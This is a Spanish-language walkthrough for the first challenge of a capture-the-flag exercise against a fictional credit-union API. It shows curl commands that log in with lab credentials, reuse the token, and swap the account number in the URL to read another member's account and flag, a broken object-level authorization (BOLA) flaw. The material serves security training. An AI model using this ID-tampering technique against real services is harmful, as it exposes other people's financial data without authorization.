# Ejemplo resuelto — Reto 1: "El saldo del vecino"

Resolvemos **juntos** el primer reto. Sirve de calentamiento: aquí aprendes la mecánica
(iniciar sesión, usar el token, explorar endpoints) que necesitarás para **todos** los
demás retos. Los otros tendrás que resolverlos por tu cuenta 😉.

> Cambia `http://<IP>:<PUERTO>` por la URL de la API **de tu equipo** (está en tu hoja
> de acceso). Los ejemplos usan `curl`, pero puedes hacer lo mismo con Postman o con la
> documentación interactiva en `/scalar/v1`.

## Paso 1 — Inicia sesión y obtén tu token

Todo socio de CardamomoPay inicia sesión con correo y contraseña y recibe un **token
JWT**, que luego se envía en cada petición.

```bash
curl -s -X POST http://<IP>:<PUERTO>/api/v2/auth/login \
  -H "Content-Type: application/json" \
  -d '{"correo":"equipo@cardamomopay.gt","contrasena":"cardamomo"}'
```

Respuesta (ejemplo):

```json
{ "token": "eyJhbGciOiJIUzI1NiI...", "nombre": "Equipo Invitado", "rol": "socio" }
```

Guarda el token en una variable para reutilizarlo:

```bash
TOKEN=$(curl -s -X POST http://<IP>:<PUERTO>/api/v2/auth/login \
  -H "Content-Type: application/json" \
  -d '{"correo":"equipo@cardamomopay.gt","contrasena":"cardamomo"}' \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
```

## Paso 2 — Mira tu propia cuenta

Con el token puedes consultar tu cuenta. Tu cuenta es la número **4**:

```bash
curl -s http://<IP>:<PUERTO>/api/v2/cuentas/4 \
  -H "Authorization: Bearer $TOKEN"
```

```json
{ "id": 4, "numero": "AV-...", "saldo": 100 }
```

Fíjate en el `4` de la URL: es el **identificador de la cuenta**. El servidor te
devuelve la cuenta que pidas por su número.

## Paso 3 — La pregunta clave

El escenario dice que doña Yolanda es la socia con más ahorros. Si el servidor te da la
cuenta que pidas *por su número*... ¿qué pasa si pides **otro número** que no es el tuyo?

```bash
# Prueba la cuenta 1 (de otro socio)
curl -s http://<IP>:<PUERTO>/api/v2/cuentas/1 \
  -H "Authorization: Bearer $TOKEN"
```

Si el servidor **no comprueba que la cuenta sea tuya**, te devolverá la cuenta ajena...
y con ella, la bandera:

```json
{ "id": 1, "numero": "AV-...", "saldo": 48250.75, "bandera": "FLAG{...}" }
```

## Paso 4 — Envía la bandera

Copia el valor `FLAG{...}` que te devolvió el servidor y envíalo en el reto
**"El saldo del vecino"** dentro de CTFd. ¡Primer reto resuelto! 🎉

---

## Lo que acabas de aprender

- Esta falla se llama **BOLA** (*Broken Object Level Authorization*): la API confía en
  el identificador que mandas y no verifica que el recurso sea tuyo.
- La técnica general que usarás en otros retos: **observa qué datos viajan en tu
  petición y prueba a cambiarlos**. Muchas fallas de APIs aparecen justo ahí.

Ahora sí: el resto de los retos son tuyos. Usa la misma mecánica (token + explorar +
modificar la petición) y apóyate en las pistas de [GUIA-RETOS.md](GUIA-RETOS.md).
